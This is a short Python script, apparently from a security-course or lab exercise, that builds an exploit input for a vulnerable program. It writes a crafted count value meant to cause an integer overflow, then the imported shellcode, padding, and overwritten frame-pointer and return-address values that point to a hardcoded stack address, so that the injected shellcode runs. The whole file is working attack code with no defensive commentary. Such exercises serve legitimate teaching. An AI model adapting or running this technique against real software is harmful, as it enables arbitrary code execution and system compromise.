from shellcode import shellcode
import sys
from struct import pack



fake_count = 0xC0000000 + len(shellcode)/4 #  will result in fake alloc of size of the shellcode
#sys.stdout.write(fake_count) #fake string length
sys.stdout.write(pack("<I",fake_count)) 

shell_begin = 0xbffea410
new_ebp = shell_begin + 8
garbage_length = 16*4

sys.stdout.write(shellcode)
sys.stdout.write("\00") 
sys.stdout.write("x"*garbage_length) 
sys.stdout.write(pack("<I",new_ebp)) 
sys.stdout.write(pack("<I",shell_begin)) 


